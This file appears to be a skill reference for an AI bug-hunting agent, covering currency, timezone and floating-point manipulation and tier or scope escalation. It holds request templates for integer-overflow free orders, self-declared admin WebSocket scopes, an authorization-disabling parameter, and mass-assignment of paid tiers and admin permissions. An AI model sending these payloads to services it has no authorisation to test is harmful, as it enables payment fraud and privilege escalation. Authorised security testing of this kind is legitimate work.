---
name: currency-tier-escalation
description: currency-tier-escalation reference material.
---

# Currency Manipulation / Tier & Scope Escalation

Part of `skills/hunt-business-logic/SKILL.md`. Read this ONLY when the target supports multi-currency pricing/refunds, OR has multi-tier/role/scope SaaS permissions (free vs. paid plan gating, client-declared scopes).

---

### Sub-technique I — Currency / timezone / floating-point manipulation

```
# Currency switch mid-flow
1. Add product priced $100.00 (USD) to cart
2. Switch site currency to JPY → cart shows ¥10,000 (100 USD × 100 JPY/USD rate)
3. Switch back to USD → if app converts ¥10,000 ÷ rate but uses STALE rate or different rate,
   USD price differs from original → exploit difference
4. Some apps round in attacker's favor; others round in app's favor — test both directions

# Timezone-based trial extension
# Trial starts at 2024-01-01 00:00 (server local time, UTC)
# User in UTC+14 → claims trial start of 2024-01-01 00:00 UTC+14 = 2023-12-31 10:00 UTC
# If server compares trial duration in user's timezone, can extend trial by ~24h × number-of-resets

# Floating-point precision exploitation
# IEEE-754 64-bit floats can't represent 0.1 exactly
# 0.1 + 0.2 = 0.30000000000000004 (NOT 0.3)
# Submit price: 0.1 ten times → expected $1.00 → actual $0.9999999999999999
# Multi-step accumulator may round to $0.99 in attacker's favor

# Integer overflow on quantity (int32 = 2^31 - 1 = 2147483647)
{"quantity": 2147483648}      # overflows to -2147483648 in 32-bit int
# Then quantity × price = negative total → free order
```

### Sub-technique J — Role / scope / tier escalation via business-logic

```
# OpenClaw 2026 critical: WebSocket shared-auth elevated scopes
ws = new WebSocket('wss://target/ws')
ws.onopen = () => {
  ws.send(JSON.stringify({
    type: 'auth',
    token: '<low-priv-token>',
    scopes: ['admin', 'billing', 'read', 'write']  # self-declared elevated scopes
  }))
}
# Server accepts client-declared scopes without re-validation

# H1 2026 medium: Set "Read Access" Role Without Pro Plan Subscription
POST /api/roles/assign
Authorization: Bearer <free-tier-token>
{
  "role": "ReadAccess",         # premium-only role
  "user_id": "<your-id>"
}
# Server doesn't check subscription tier before assigning role

# Starknet Snap enableAuthorize bypass (H1 2026 medium)
POST /api/wallet/sign
{
  "transaction": "...",
  "enableAuthorize": false      # toggle off authorization check
}
# Server respects client-supplied enableAuthorize parameter

# Generic mass-assignment for tier escalation (cross-reference hunt-idor Sub-technique G)
PATCH /api/users/me
{
  "subscription_tier": "enterprise",
  "is_paid": true,
  "trial_ends_at": "2099-12-31",
  "credits": 999999,
  "permissions": ["admin", "billing", "delete_users"]
}
# Verify via subsequent GET; many APIs hide changes in response but persist in DB
```

